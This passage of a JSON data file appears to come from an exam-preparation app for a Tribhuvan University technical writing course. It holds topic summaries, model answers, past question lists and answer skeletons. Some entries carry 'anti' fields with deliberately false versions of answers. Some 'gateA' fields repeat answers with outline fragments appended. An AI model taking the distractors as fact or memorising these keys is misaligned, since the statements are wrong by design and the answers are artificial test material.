advantages","y":"TW Question Bank 2079","marks":10,"rep":0}],"reps":[]},{"n":7,"name":"Information Reports","rank":3,"q":13,"m":75,"share":11,"cum":38,"hook":"The health post sends the district office a monthly sheet of numbers, with no opinion attached.","idea":"An information report carries facts to a reader who was not present, in a shape that reader can use. Nothing is recommended, because the recommendation belongs to whoever has the authority. If the writer does recommend, the report claims authority it was not given, so it is either rejected or acted on as advice it was never scoped to give. Structure follows the reader's questions: what period, what happened, what is unfinished, what changed the plan. The summary is the plain-language version for the manager; the abstract is the compressed technical version for the specialist.","one":"An information report carries facts, not advice, in a shape that lets an absent reader compare and decide.","gate":{"q":"Why does an information report lose its definition the moment it says we recommend?","a":"An information report presents findings so that whoever holds authority can decide, while a recommendation report performs that deciding. The moment the writer writes we recommend, the document claims authority it was not given, and the reader can no longer separate evidence from judgement. The consequence is that the report is either rejected or acted on as an advisory document it was never scoped to be."},"top":{"id":"tw-30","q":"Describe the structure and key components of a technical report. How does this structure enhance the report’s effectiveness?","y":"TW Question Bank 2081","marks":10,"rep":0,"ans":"A technical report has a fixed architecture because readers do not read it front to back; they hunt for a section.\nFront matter: title page, letter of transmittal, table of contents, list of figures and an executive summary, which alone lets a manager decide in two minutes.\nBody:\n• Introduction — background, problem, purpose, scope, limitations, method.\n• Findings — evidence under headings, with tables and figures.\n• Conclusions — what the evidence shows, with no new material.\n• Recommendations — specific, actionable, prioritised and costed.\nBack matter: references, appendices for raw data and questionnaires, glossary and index.\n\nWhy it works: a predictable location saves search time; the summary and recommendations serve decision-makers; appendices keep detail available without bloating the body; references make claims checkable; headings allow selective reading; and a stated limitation builds credibility. A 40-page evaluation with no executive summary is read by nobody, so structure is how the report gets used, not a formality.","skel":["Front matter: title, contents, summary","Body: introduction with scope and method","Findings, conclusions, recommendations","Back matter: references, appendices, glossary","Effectiveness: selective reading, credibility"],"logic":"Tests report architecture as a reader service. Listing parts earns half marks; the rest comes from explaining what each part does for a reader who is searching, not reading.","how":"Three blocks: front matter, body, back matter. One line per part with its job, then a short paragraph on effectiveness.","gateA":"A technical report has a fixed architecture because readers do not read it front to back; they hunt for a section.\nFront matter: title page, letter of transmittal, table of contents, list of figures and an executive summary, which alone lets a manager decide in two minutes.\nBody:\n• Introduction — background, problem, purpose, scope, limitations, method.\n• Findings — evidence under headings, with tables and figures.\n• Conclusions — what the evidence shows, with no new material.\n• Recommendations — specific, actionable, prioritised and costed.\nBack matter: references, appendices for raw data and questionnaires, glossary and index.\n\nWhy it works: a predictable location saves search time; the summary and recommendations serve decision-makers; appendices keep detail available without bloating the body; references make claims checkable; headings allow selective reading; and a stated limitation builds credibility. A 40-page evaluation with no executive summary is read by nobody, so structure is how the report gets used, not a formality. Front matter: title, contents, summary Body: introduction with scope and method Findings, conclusions, recommendations Back matter: references, appendices, glossary Effectiveness: selective reading, credibility","anti":"A technical report has no fixed structure because readers read it front to back; the executive summary comes last, findings and recommendations are optional, and references and appendices belong in the introduction, which weakens selective reading."},"keys":["Information report","Summary","Abstract","Informative abstract","Descriptive abstract","Mechanism description"],"ask":[{"id":"tw-30","q":"Describe the structure and key components of a technical report. How does this structure enhance the report’s effectiveness?","y":"TW Question Bank 2081","marks":10,"rep":0},{"id":"tw-77","q":"Write news release for your college to announce an education fair.","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-23","q":"Your company has developed a new cybersecurity software product. Write a persuasive news release (maximum 300 words) announcing this launch suitable for tech media outlets. Use the inverted pyramid structure.","y":"TW Model Set I","marks":5,"rep":0},{"id":"tw-35","q":"What is the purpose of an executive summary in a technical document?","y":"TW Question Bank 2081","marks":5,"rep":0}],"reps":[]},{"n":4,"name":"Brief Correspondence","rank":4,"q":10,"m":70,"share":11,"cum":49,"hook":"An email with the subject line 'Query' sits unopened in a bank manager's inbox behind forty others.","idea":"Correspondence is built for a reader who is still deciding whether to give you their attention: the subject names the business, the first line states the purpose, the middle carries only what is needed to decide or act, and the close says who does what next. The distance decides the ceremony. A memo stays inside one organisation, so it needs no salutation, no inside address and no complimentary close, only TO, FROM, DATE and SUBJECT; a letter may travel to a customer, supplier or authority, so it must identify both parties, carry a signature and survive being filed.","one":"Every message is a knock on a busy person's door: say who you are, what you want, and by when.","gate":{"q":"Why is a memo structured differently from a business letter?","a":"A memo stays inside one organisation, so it needs no salutation, no inside address and no complimentary close, only TO, FROM, DATE and SUBJECT above the body. A letter may travel to a customer, supplier or authority, so it must identify both parties, carry a signature and survive being filed. The distance decides the ceremony."},"top":{"id":"tw-29","q":"You are now studying IT in a reputed campus under Tribhuvan University, Nepal. The campus has a well-equipped computer lab. You remember the school where you completed your secondary-level education. Most schools in Nepal have only a couple of desktop computers. You want to donate about a dozen computers to the school by raising funds. Write a letter to the Chief District Officer requesting him/her to permit you to collect donations. Include the specifications of the computers and the price list with the letter.","y":"TW Question Bank 2081","marks":10,"rep":0,"ans":"House No. 14, Kupondole, Lalitpur\n12 November 2082\nThe Chief District Officer\nDistrict Administration Office, Lalitpur\n\nSubject: Request for permission to collect donations for a school computer lab\n\nDear Sir/Madam,\n\nI am a sixth-semester B.Sc. CSIT student at [Campus], Lalitpur. I wish to donate twelve computers to Shree Janata Secondary School, where I studied, and request your permission to collect public donations for this purpose from 1 December to 31 January.\n\nMost community schools in Nepal have one or two working computers for hundreds of students. This donation would give the school a 12-seat lab for its computer science classes.\n\nSpecifications and estimated cost per unit: Intel Core i3, 8 GB RAM, 256 GB SSD, 19-inch monitor, keyboard and mouse — Rs 42,000. Twelve units: Rs 5,04,000. Networking, UPS and installation: Rs 60,000. Total: Rs 5,64,000.\n\nDonations will be receipted, held in a separate account and audited by the campus, and a completion report will be sent to your office.\n\nI shall be grateful for your approval.\n\nYours faithfully,\n[Name], [Phone], [Email]\nEnclosures: school recommendation letter; two price quotations","skel":["Sender address, date, inside address","Subject line naming the request","Who you are and what you ask","Specifications and itemised costs","Accountability, close, enclosures"],"logic":"A full business letter with an enclosure list. The examiner checks letter parts, a clear request, credible specifics and a polite close; a memo or an email format loses marks immediately.","how":"Use full block letter form: sender, date, inside address, subject, salutation, three paragraphs, close, enclosures. Put the price list in bullets.","gateA":"House No. 14, Kupondole, Lalitpur\n12 November 2082\nThe Chief District Officer\nDistrict Administration Office, Lalitpur\n\nSubject: Request for permission to collect donations for a school computer lab\n\nDear Sir/Madam,\n\nI am a sixth-semester B.Sc. CSIT student at [Campus], Lalitpur. I wish to donate twelve computers to Shree Janata Secondary School, where I studied, and request your permission to collect public donations for this purpose from 1 December to 31 January.\n\nMost community schools in Nepal have one or two working computers for hundreds of students. This donation would give the school a 12-seat lab for its computer science classes.\n\nSpecifications and estimated cost per unit: Intel Core i3, 8 GB RAM, 256 GB SSD, 19-inch monitor, keyboard and mouse — Rs 42,000. Twelve units: Rs 5,04,000. Networking, UPS and installation: Rs 60,000. Total: Rs 5,64,000.\n\nDonations will be receipted, held in a separate account and audited by the campus, and a completion report will be sent to your office.\n\nI shall be grateful for your approval.\n\nYours faithfully,\n[Name], [Phone], [Email]\nEnclosures: school recommendation letter; two price quotations Sender address, date, inside address Subject line naming the request Who you are and what you ask Specifications and itemised costs Accountability, close, enclosures","anti":"A job application should omit the sender address, date and inside address, state no post or advertisement, list no achievements, and end without a signature block, because the employer already knows the applicant."},"keys":["Memo","Business letter parts","Full block format","Modified block","Direct plan","Indirect plan"],"ask":[{"id":"tw-29","q":"You are now studying IT in a reputed campus under Tribhuvan University, Nepal. The campus has a well-equipped computer lab. You remember the school where you completed your secondary-level education. Most schools in Nepal have only a couple of desktop computers. You want to donate about a dozen computers to the school by raising funds. Write a letter to the Chief District Officer requesting him/her to permit you to collect donations. Include the specifications of the computers and the price list with the letter.","y":"TW Question Bank 2081","marks":10,"rep":0},{"id":"tw-64","q":"Write a business letter to a Chinese computer company, Beijing for regular supply of assembled computers and computers parts as you are running a computer shop at New Road, Kathmandu. Include the issues or modality of payment and possible problems in business transaction.","y":"TW Question Bank 2075","marks":10,"rep":0},{"id":"tw-82","q":"Write an e-mail that announces a new skill-oriented program at Shikhar IT Solutions. The program will allow workers to share each other’s experience and grow together.","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-83","q":"The Board of Directors of your company Nepal Distillery Ltd. has passed a proposal on providing bonus and incentives to all the employees. As a secretary of the company, you are responsible for informing the staff about the decision taken by the board meeting. Write a memo informing about the recently taken decision.","y":"TW Question Bank 2079","marks":10,"rep":0}],"reps":[]},{"n":5,"name":"Document Design and Graphics","rank":5,"q":10,"m":65,"share":10,"cum":59,"hook":"A patient at the hospital gate cannot read the board, and still finds the X-ray room in ten seconds.","idea":"Design is signposting for a reader under pressure, who goes to the figure first and may never read the paragraph that explains it. Proximity groups what belongs together, alignment puts things on a shared line, repetition teaches the reader your pattern once, and contrast says what matters first. A graphic needs titles, axis labels with units, a legend and a source so it can be understood in isolation, and those also stop a truncated axis from exaggerating a difference; without them the reader guesses, and a guess in a procedure or a budget is a defect.","one":"Design for the reader who scans: group, align, repeat, contrast, and label every graphic so it stands alone.","gate":{"q":"Why does a chart need a title, labelled axes with units, a legend and a source?","a":"A reader under pressure goes to the figure first and may never read the paragraph that explains it. Titles, axis labels with units, a legend and a source let the graphic be understood in isolation, and they also stop a truncated axis from exaggerating a difference. Without them the reader guesses, and a guess in a procedure or a budget is a defect."},"top":{"id":"tw-11","q":"Make a flow-chart diagram of your dream application.","y":"TW Question Bank 2082","marks":5,"rep":2,"ans":"Flow chart — CampusBus, a bus-tracking app for Kathmandu commuters.\nSymbols: oval = start/stop, rectangle = process, diamond = decision, parallelogram = input/output, arrow = flow.\n\nOval: Start\nParallelogram: Read GPS location and route number\nRectangle: Send location to server every 15 seconds\nParallelogram: Display nearest buses and arrival times\nDiamond: Route selected?\n  Yes → Rectangle: Show map with live bus positions → Diamond: Bus within 5 minutes?\n     Yes → Parallelogram: Send push alert → Oval: Stop\n     No → Rectangle: Show next two arrival times → Oval: Stop\n  No → Rectangle: Show search and popular routes → back to route selection\nDiamond: Network error? Yes → Parallelogram: Show last cached time and retry → Oval: Stop\nDraw one flow direction downward, label every arrow Yes/No, add a title and legend.","skel":["Name the app and its one job","Symbol key: oval, rectangle, diamond","Main path: location to nearest bus","Two decision branches with Yes and No","Label arrows, add title and legend"],"logic":"Tests graphic literacy: correct symbols, one flow direction, labelled decisions. The marks are for the shape of the chart, not the brilliance of the app idea.","how":"Name the app in one line, list the symbol key, then trace the flow top to bottom with Yes/No on every arrow.","gateA":"Flow chart — CampusBus, a bus-tracking app for Kathmandu commuters.\nSymbols: oval = start/stop, rectangle = process, diamond = decision, parallelogram = input/output, arrow = flow.\n\nOval: Start\nParallelogram: Read GPS location and route number\nRectangle: Send location to server every 15 seconds\nParallelogram: Display nearest buses and arrival times\nDiamond: Route selected?\n  Yes → Rectangle: Show map with live bus positions → Diamond: Bus within 5 minutes?\n     Yes → Parallelogram: Send push alert → Oval: Stop\n     No → Rectangle: Show next two arrival times → Oval: Stop\n  No → Rectangle: Show search and popular routes → back to route selection\nDiamond: Network error? Yes → Parallelogram: Show last cached time and retry → Oval: Stop\nDraw one flow direction downward, label every arrow Yes/No, add a title and legend. Name the app and its one job Symbol key: oval, rectangle, diamond Main path: location to nearest bus Two decision branches with Yes and No Label arrows, add title and legend","anti":"A flow chart uses a rectangle for start and stop, a diamond for input and output, and an oval for a process; decisions have one branch, arrows are unlabelled, and a title or legend is unnecessary."},"keys":["CRAP principles","White space","Serif vs sans","Left-ragged alignment","Line graph","Bar chart"],"ask":[{"id":"tw-11","q":"Make a flow-chart diagram of your dream application.","y":"TW Question Bank 2082","marks":5,"rep":2},{"id":"tw-3","q":"What role do document design principles play in technical communication? Explain with examples.","y":"TW Question Bank 2082","marks":10,"rep":0},{"id":"tw-46","q":"What are graphics? How are they used in technical writing?","y":"TW Question Bank 2080","marks":10,"rep":0},{"id":"tw-67","q":"Explain the importance of using table, illustrations, graphic presentation in an academic writing. Give some suitable examples.","y":"TW Question Bank 2075","marks":10,"rep":0}],"reps":[{"id":"r24","q":"Make a flow-chart diagram of your dream application.","count":2,"marks":5}]},{"n":2,"name":"Audience and Purpose","rank":6,"q":7,"m":60,"share":9,"cum":68,"hook":"One notice about road widening is pinned at the ward office, and five people read it needing five different things.","idea":"Audience analysis is deciding which reader the document is built around. The primary reader acts on it, secondary readers approve or pass it on, tertiary readers meet it by accident. Their knowledge, role, attitude and where they read it decide your vocabulary, your depth and your order of information. Purpose is the single verb the document must accomplish.","one":"Write for the one reader who must act, then add what the others need without rewriting it for them.","gate":{"q":"Why must a writer name one primary reader before deciding vocabulary, depth and medium?","a":"The primary reader is the person who must act, so their knowledge and situation set the ceiling on every choice. If the document is built around that reader, vocabulary matches what they know, depth stops where their task ends, and the medium fits where they will read it. A document aimed at everyone drifts toward the average and fails the one reader who must act."},"top":{"id":"tw-1","q":"Explain the concept of audience analysis in technical writing. Develop an audience profile for a user manual of a mobile banking application.","y":"TW Question Bank 2082","marks":10,"rep":0,"ans":"Audience analysis is identifying who will read a document, what they already know and what they need from it, so that content, vocabulary, depth and format are matched to them.\n• Primary audience (acts on it) — account holders using the app.\n• Secondary (advises or approves) — branch staff, support agents.\n• Tertiary (incidental) — auditors, regulators.\nFactors: knowledge level, role, needs, attitude, reading context, constraints.\n\nAudience profile — Mobile Banking User Manual\n• Readers: existing customers, 18-65, mixed digital literacy; most use an Android phone.\n• Prior knowledge: can install apps and log in; do not know OTP, KYC or beneficiary.\n• Needs: reset password, add a payee, check charges, recover a failed transfer.\n• Attitude: anxious about money and fraud; want reassurance, not marketing.\n• Context: read on a small screen, often while a transaction is stuck.\n• Constraints: low bandwidth, Nepali or simple English, no jargon.\nSo: task-based headings, screenshots, numbered steps, 12-point sans-serif, a glossary, every acronym expanded once.","skel":["Define audience analysis in one line","Primary, secondary, tertiary readers","Six factors: knowledge, role, needs, attitude, context, constraints","Profile as labelled bullets for the banking manual","Close: how the profile changes the writing"],"logic":"Tests whether you can turn a definition into a usable tool. The examiner wants the three audience types plus a profile that reads like a real reader, not a generic list of adjectives.","how":"Define, list three audience types and six factors, then write the profile as six labelled bullets, one per factor. Keep the example mobile-first.","gateA":"Audience analysis is identifying who will read a document, what they already know and what they need from it, so that content, vocabulary, depth and format are matched to them.\n• Primary audience (acts on it) — account holders using the app.\n• Secondary (advises or approves) — branch staff, support agents.\n• Tertiary (incidental) — auditors, regulators.\nFactors: knowledge level, role, needs, attitude, reading context, constraints.\n\nAudience profile — Mobile Banking User Manual\n• Readers: existing customers, 18-65, mixed digital literacy; most use an Android phone.\n• Prior knowledge: can install apps and log in; do not know OTP, KYC or beneficiary.\n• Needs: reset password, add a payee, check charges, recover a failed transfer.\n• Attitude: anxious about money and fraud; want reassurance, not marketing.\n• Context: read on a small screen, often while a transaction is stuck.\n• Constraints: low bandwidth, Nepali or simple English, no jargon.\nSo: task-based headings, screenshots, numbered steps, 12-point sans-serif, a glossary, every acronym expanded once. Define audience analysis in one line Primary, secondary, tertiary readers Six factors: knowledge, role, needs, attitude, context, constraints Profile as labelled bullets for the banking manual Close: how the profile changes the writing","anti":""},"keys":["Primary audience","Secondary audience","Tertiary audience","Knowledge level","Attitude","Reader persona"],"ask":[{"id":"tw-1","q":"Explain the concept of audience analysis in technical writing. Develop an audience profile for a user manual of a mobile banking application.","y":"TW Question Bank 2082","marks":10,"rep":0},{"id":"tw-28","q":"Explain the role of audience analysis in technical writing and provide an example of how understanding the audience can affect the content and style of a technical document.","y":"TW Question Bank 2081","marks":10,"rep":0},{"id":"tw-45","q":"You have watched one of your peer’s vlog (video blog) entries on the issue of “Blocked mind as a malfunction of communication”. What have you learned in addition to your ideas you learned from your teacher? How do your experiences in unblocking the mind differ from your peer? Write feedback to your peer’s vlog.","y":"TW Question Bank 2080","marks":10,"rep":0},{"id":"tw-65","q":"Write a newspaper article on “use of computer in Higher education” using headings subheadings, you should write it thinking about the aim and audience of your writing.","y":"TW Question Bank 2075","marks":10,"rep":0}],"reps":[]},{"n":6,"name":"Writing for the Web","rank":7,"q":8,"m":55,"share":8,"cum":76,"hook":"A bus stops for forty seconds at a highway tea shop, and the shop has forty seconds to be understood.","idea":"Web readers scan for relevance before they commit to reading, so the page answers at the top and expands downwards. The inverted pyramid puts the conclusion first, chunking splits it into one-idea blocks, and headings, bullets and front-loaded keywords make those blocks findable. One page does one task, because a page that does three gives the visitor three chances to leave. The visitor arrives from a search result, mid-task, and leaves at no cost, so attention must be earned in the first screen, and a page that builds to its answer spends the reader's patience before delivering anything.","one":"On the web you have seconds: put the answer first, one idea per chunk, and make every heading scannable.","gate":{"q":"Why must a web page state its answer before its background?","a":"The visitor arrives from a search result, mid-task, and leaves at no cost, so attention must be earned in the first screen. The inverted pyramid therefore puts the conclusion first, then supporting detail, then background. A page that builds to its answer spends the reader's patience before delivering anything, and the visit ends without the answer being read."},"top":{"id":"tw-15","q":"You are working as a web content manager for a software development company in Nepal. Your company wants to redesign its website to improve user experience, accessibility, and search engine visibility. Write a comprehensive proposal addressing: (a) Key principles for organizing and designing web pages, (b) Best practices for writing effective web content, (c) Information architecture considerations, (d) How to ensure web accessibility for users with disabilities. Include specific examples relevant to a tech company.","y":"TW Model Set I","marks":10,"rep":0,"ans":"Proposal: Website Redesign for [Company], Kathmandu\nSubmitted by: Web Content Manager. Duration: 10 weeks. Cost: Rs 6,50,000.\n\n1. Problem and purpose\nThe services page has a 68 per cent bounce rate and the site is unusable on a phone. Purpose: improve user experience, accessibility and search visibility.\n\n2. Organising and designing pages (a)\nOne page, one task. Five top-level navigation items, breadcrumbs, one template, mobile-first grid, visible calls to action, 16px body text, high contrast.\n\n3. Writing web content (b)\nInverted pyramid; keyword front-loaded headings; two-to-four-line paragraphs; bullets; active voice and second person (you can request a demo); descriptive link text; a meta title and description per page.\n\n4. Information architecture (c)\nCard-sort the 120 existing pages into services, solutions, case studies, about and contact; retire 40 obsolete pages; clean URLs such as /services/cloud-migration; redirect map and XML sitemap.\n\n5. Accessibility (d)\nWCAG 2.1 AA: keyboard navigation, 4.5:1 contrast, captions on demo videos, form labels, no colour-only meaning, screen-reader testing.\n\nDeliverables: content audit, sitemap, wireframes, 30 rewritten pages, accessibility report.","skel":["Proposal header: author, duration, cost","Problem and purpose","Page organisation and content rules","Information architecture and SEO","Accessibility to WCAG 2.1 AA"],"logic":"A structured production task. The examiner is checking that you cover all four requested areas as a proposal with sections, and that web rules like inverted pyramid, chunking and WCAG appear.","how":"Write it as a proposal with a header block and five numbered sections matching (a) to (d), plus deliverables. Bullets, not paragraphs.","gateA":"Proposal: Website Redesign for [Company], Kathmandu\nSubmitted by: Web Content Manager. Duration: 10 weeks. Cost: Rs 6,50,000.\n\n1. Problem and purpose\nThe services page has a 68 per cent bounce rate and the site is unusable on a phone. Purpose: improve user experience, accessibility and search visibility.\n\n2. Organising and designing pages (a)\nOne page, one task. Five top-level navigation items, breadcrumbs, one template, mobile-first grid, visible calls to action, 16px body text, high contrast.\n\n3. Writing web content (b)\nInverted pyramid; keyword front-loaded headings; two-to-four-line paragraphs; bullets; active voice and second person (you can request a demo); descriptive link text; a meta title and description per page.\n\n4. Information architecture (c)\nCard-sort the 120 existing pages into services, solutions, case studies, about and contact; retire 40 obsolete pages; clean URLs such as /services/cloud-migration; redirect map and XML sitemap.\n\n5. Accessibility (d)\nWCAG 2.1 AA: keyboard navigation, 4.5:1 contrast, captions on demo videos, form labels, no colour-only meaning, screen-reader testing.\n\nDeliverables: content audit, sitemap, wireframes, 30 rewritten pages, accessibility report. Proposal header: author, duration, cost Problem and purpose Page organisation and content rules Information architecture and SEO Accessibility to WCAG 2.1 AA","anti":""},"keys":["Inverted pyramid","Chunking","Scannability","Descriptive link text","Second person","One page, one task"],"ask":[{"id":"tw-15","q":"You are working as a web content manager for a software development company in Nepal. Your company wants to redesign its website to improve user experience, accessibility, and search engine visibility. Write a comprehensive proposal addressing: (a) Key principles for organizing and designing web pages, (b) Best practices for writing effective web content, (c) Information architecture considerations, (d) How to ensure web accessibility for users with disabilities. Include specific examples relevant to a tech company.","y":"TW Model Set I","marks":10,"rep":0},{"id":"tw-75","q":"Write a FAQ on how to get admission to B.Sc. CSIT at TU.","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-12","q":"Write short notes on:","y":"TW Question Bank 2082","marks":5,"rep":0},{"id":"tw-22","q":"What is information architecture in web design? Describe the special considerations for writing different types of web pages: homepage, product page, and FAQ page.","y":"TW Model Set I","marks":5,"rep":0}],"reps":[]},{"n":8,"name":"Employment Communication","rank":8,"q":7,"m":45,"share":7,"cum":83,"hook":"Two hundred resumes reach a software company for one post, and the shortlist is made in an afternoon.","idea":"Employment writing is an argument addressed to one advertised job. The resume supplies evidence, arranged in whichever order makes the strongest case — time, skill, or both — and every line answers the reader's only question. The cover letter supplies the reason for this employer in particular. Neither is a record of a life; both are a match between a stated need and demonstrated work.","one":"A resume is an argument that you can do this job, evidenced in numbers, not an autobiography.","gate":{"q":"Why is a résumé described as an argument rather than a record of your career?","a":"A résumé is read against one advertised post, by a reader who has twenty seconds and one question: can this person do this job. So it selects evidence rather than listing duties, orders it by whatever makes the strongest case, and quantifies results. A career record explains what happened to you, while a targeted argument answers the employer's need."},"top":{"id":"tw-76","q":"If you are seeking a summer or part-time job, applying for admission to a school, or","y":"TW Question Bank 2079","marks":10,"rep":0,"ans":"Baneshwor, Kathmandu\n13 November 2026\n\nThe Human Resources Manager\nShikhar IT Solutions\nPutalisadak, Kathmandu\n\nDear Sir/Madam,\n\nSubject: Application for the post of part-time web developer\n\nI am writing to apply for the part-time web developer post advertised on your website on 10 November. I am a sixth-semester B.Sc. CSIT student at Tribhuvan University and can work twenty hours a week, including Saturdays.\n\nI have built three live projects: a college notice board in PHP and MySQL, a restaurant menu site in React, and a result scraper used by my department. In my last project I cut page load time from 4.2 to 1.8 seconds by compressing images and caching queries. I work comfortably with Git, responsive design and browser debugging.\n\nYour municipal e-governance portals interest me because they put code in front of citizens who need it, and I would like to contribute while finishing my degree.\n\nMy résumé is attached. I am free for an interview any afternoon after 2 p.m. and can start within a week.\n\nSincerely,\nArun Sharma\n98XXXXXXXX","skel":["Sender, date, inside address, salutation","Para 1: post and where advertised","Para 2: two quantified achievements","Para 3: why them plus interview request","Close and signature block"],"logic":"A full block business letter marked on parts, not content. Date, inside address, salutation, close and signature carry marks that students routinely drop.","how":"Recall the nine letter parts, then fill three short paragraphs: post applied for, two quantified achievements, availability.","gateA":"Baneshwor, Kathmandu\n13 November 2026\n\nThe Human Resources Manager\nShikhar IT Solutions\nPutalisadak, Kathmandu\n\nDear Sir/Madam,\n\nSubject: Application for the post of part-time web developer\n\nI am writing to apply for the part-time web developer post advertised on your website on 10 November. I am a sixth-semester B.Sc. CSIT student at Tribhuvan University and can work twenty hours a week, including Saturdays.\n\nI have built three live projects: a college notice board in PHP and MySQL, a restaurant menu site in React, and a result scraper used by my department. In my last project I cut page load time from 4.2 to 1.8 seconds by compressing images and caching queries. I work comfortably with Git, responsive design and browser debugging.\n\nYour municipal e-governance portals interest me because they put code in front of citizens who need it, and I would like to contribute while finishing my degree.\n\nMy résumé is attached. I am free for an interview any afternoon after 2 p.m. and can start within a week.\n\nSincerely,\nArun Sharma\n98XXXXXXXX Sender, date, inside address, salutation Para 1: post and where advertised Para 2: two quantified achievements Para 3: why them plus interview request Close and signature block","anti":""},"keys":["Résumé","CV","Chronological résumé","Functional résumé","Combination résumé","Achievement statement"],"ask":[{"id":"tw-76","q":"If you are seeking a summer or part-time job, applying for admission to a school, or","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-78","q":"Suppose you have just completed the undergraduate degree (with a high GPA). Create a","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-21","q":"Compare and contrast chronological resumes with functional resumes. When would you recommend using each type? Create a brief functional resume highlighting skills for a Technical Writer position.","y":"TW Model Set I","marks":5,"rep":0},{"id":"tw-51","q":"Construct a resume for the position of IT officer to apply in one of the companies in the US. In the resume present the candidate’s professional ability to contribute to a new employment.","y":"TW Question Bank 2080","marks":5,"rep":0}],"reps":[]},{"n":12,"name":"Ethics in the Workplace","rank":9,"q":6,"m":40,"share":6,"cum":89,"hook":"The Dashain bonus memo is due at five, and three contract staff are not on the list.","idea":"Ethics is what you do where the rulebook stops and someone still has to choose. Accuracy is a property of each sentence, while honesty is a property of the whole document: omitting three contract staff from a bonus memo, starting a chart axis at ninety per cent, or moving a bad month to an appendix leaves every figure correct yet steers the reader to a false conclusion. The test is whether a reader holding only this document would reach the conclusion the writer reached.","one":"Ethics in writing is whether a reader with only your document would reach the same conclusion you did.","gate":{"q":"Why is a factually accurate document still capable of misleading its reader?","a":"Accuracy is a property of each sentence, while honesty is a property of the whole document. Omitting three contract staff from a bonus memo, starting a chart axis at ninety per cent, or moving a bad month to an appendix leaves every figure correct yet steers the reader to a false conclusion. The test is whether a reader holding only this document would reach the conclusion the writer reached."},"top":{"id":"tw-16","q":"Discuss the importance of ethics in technical writing and workplace communication. What ethical dilemmas might technical writers face in the IT industry? Explaxain the steps a technical writer should take when confronted with ethical issues such as inaccurate information, plagiarism, or organizational wrongdoing. How can organizations create a culture of ethics? Support your answer with real-world examples.","y":"TW Model Set I","marks":10,"rep":0,"ans":"Ethics is the set of principles guiding right conduct where rules run out. In technical writing it decides whether a document can be trusted, and trust is the only reason a reader follows instructions.\nDilemmas in IT:\n• A release note must ship tonight but a known data-loss bug is undocumented.\n• A vendor pressures you to delete an unfavourable benchmark from an evaluation.\n• A manager wants a breach described as a minor incident.\n• Copying a competitor's documentation, or reusing a colleague's text without credit.\n\nSteps when confronted:\n1. Recognise and name the issue. 2. Gather facts, logs and test results. 3. Identify stakeholders and who is harmed. 4. Check the code of conduct, contract and law. 5. Escalate in writing to the supervisor and keep a record. 6. Refuse to sign inaccurate content and propose a corrected version. 7. Review the outcome.\n\nCulture of ethics: a written code, leaders who admit error, regular training, protected whistleblowing, incentives for accuracy, and real consequences for violation.","skel":["Importance: trust and safety","Four IT dilemmas in one line each","Seven steps from recognition to review","Escalate in writing, refuse to sign","Culture: code, training, protection, incentives"],"logic":"A four-part question and most students answer only part one. Marks are distributed across dilemmas, the step sequence, and the organisational culture, so all four must appear.","how":"Split the page into four labelled blocks: importance, dilemmas, steps, culture. Two lines each and number the steps.","gateA":"Ethics is the set of principles guiding right conduct where rules run out. In technical writing it decides whether a document can be trusted, and trust is the only reason a reader follows instructions.\nDilemmas in IT:\n• A release note must ship tonight but a known data-loss bug is undocumented.\n• A vendor pressures you to delete an unfavourable benchmark from an evaluation.\n• A manager wants a breach described as a minor incident.\n• Copying a competitor's documentation, or reusing a colleague's text without credit.\n\nSteps when confronted:\n1. Recognise and name the issue. 2. Gather facts, logs and test results. 3. Identify stakeholders and who is harmed. 4. Check the code of conduct, contract and law. 5. Escalate in writing to the supervisor and keep a record. 6. Refuse to sign inaccurate content and propose a corrected version. 7. Review the outcome.\n\nCulture of ethics: a written code, leaders who admit error, regular training, protected whistleblowing, incentives for accuracy, and real consequences for violation. Importance: trust and safety Four IT dilemmas in one line each Seven steps from recognition to review Escalate in writing, refuse to sign Culture: code, training, protection, incentives","anti":""},"keys":["Ethics","Ethical dilemma","Conflict of interest","Whistleblowing","Plagiarism","Culture of ethics"],"ask":[{"id":"tw-16","q":"Discuss the importance of ethics in technical writing and workplace communication. What ethical dilemmas might technical writers face in the IT industry? Explaxain the steps a technical writer should take when confronted with ethical issues such as inaccurate information, plagiarism, or organizational wrongdoing. How can organizations create a culture of ethics? Support your answer with real-world examples.","y":"TW Model Set I","marks":10,"rep":0},{"id":"tw-31","q":"What are the ethical considerations in technical writing, and how can a writer ensure they adhere to ethical standards?","y":"TW Question Bank 2081","marks":10,"rep":0},{"id":"tw-25","q":"You discovered that your company’s technical documentation contains inaccurate safety information about a software vulnerability that could potentially harm users. Write a brief memo to your supervisor explaining the situation and recommending immediate corrective action.","y":"TW Model Set I","marks":5,"rep":0},{"id":"tw-27","q":"Write short notes on: a) Whistleblowing in technical communication b) Mechanism description versus process description","y":"TW Model Set I","marks":5,"rep":0}],"reps":[]},{"n":9,"name":"Presentations","rank":10,"q":5,"m":35,"share":5,"cum":94,"hook":"A bus to Pokhara has eleven stops, and the driver who stops everywhere arrives at midnight.","idea":"A presentation is a queue of one idea per slide, held together by signposting. The introduction buys attention and sets the route, the body delivers one point at a time with a spoken transition between, and the conclusion repeats the point and asks for the action. Slides carry evidence, not script, because an audience can read or listen but not both. An audience holds about one idea at a time, so eleven half-ideas leave the room with none, and a slide of paragraph text is read instead of heard.","one":"One idea per slide, signposted joins, rehearsed to time — an audience can hold one thing at a time.","gate":{"q":"Why does a presentation fail when the speaker tries to say everything the report contains?","a":"An audience holds about one idea at a time, so a talk that carries eleven half-ideas leaves the room with none. The mechanism is that points compete for the same attention, and a slide of paragraph text is read instead of heard. Fixing one core message with three to five evidenced points, signposted and rehearsed to time, is what survives."},"top":{"id":"tw-73","q":"“The success with which you handle oral reporting may determine whether you are","y":"TW Question Bank 2079","marks":10,"rep":0,"ans":"Oral reporting is the spoken delivery of findings or progress — a briefing, a project update, a viva, a client pitch. In most organisations you are judged on it more than on your files, because it is the performance senior people actually see.\n\nWhy it decides your career:\n• Visibility — a clear ten-minute update makes your work known; silent good work stays invisible.\n• Public judgement — a muddled answer in a meeting is remembered longer than a good report.\n• Trust — managers promote people who can explain risk calmly to a client.\n\nHow to handle it:\n1. Analyse audience and purpose; write the core message in one sentence.\n2. Structure: hook and roadmap → three main points with evidence → summary and a specific request.\n3. One clear visual per point.\n4. Rehearse aloud and timed; anticipate five questions.\n5. Deliver with eye contact, about 130 words a minute, pauses, no reading.\n\nClose by stating what you need and by when; an oral report without an ask wastes the 